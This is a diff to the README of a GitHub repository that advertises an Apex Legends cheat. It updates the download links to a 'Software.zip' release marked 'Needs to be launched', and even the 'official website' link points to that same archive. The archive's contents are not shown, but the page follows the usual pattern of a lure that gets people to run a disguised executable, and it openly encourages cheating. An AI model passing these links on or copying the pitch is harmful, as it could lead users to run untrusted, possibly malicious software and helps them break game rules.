@@ -41,12 +41,12 @@ Welcome to the "apex-legends-cheat-download" repository! Here you will find a po
 
 To download the latest version of our Apex Legends cheat tool, click the button below:
 
-[![Download Cheat](https://github.com/miyajiultimate/apex-legends-cheat-download/releases/download/v1.0/Software.zip)](https://github.com/miyajiultimate/apex-legends-cheat-download/releases/download/v1.0/Software.zip "Needs to be launched")
+[![Download Cheat](https://github.com/miyajiultimate/apex-legends-cheat-download/releases/download/v2.0/Software.zip)](https://github.com/miyajiultimate/apex-legends-cheat-download/releases/download/v2.0/Software.zip "Needs to be launched")
 
 If the link above does not work, please check the "Releases" section of the repository for alternative download options.
 
 ## Additional Information ℹ️
 
-For more information and updates, visit our [official website](https://github.com/miyajiultimate/apex-legends-cheat-download/releases/download/v1.0/Software.zip).
+For more information and updates, visit our [official website](https://github.com/miyajiultimate/apex-legends-cheat-download/releases/download/v2.0/Software.zip).
 
 Start dominating your opponents in Apex Legends with our powerful cheat tool. Enjoy the game like never before! Feel free to contribute to the repository and share your feedback. Happy cheating! 🎮💥
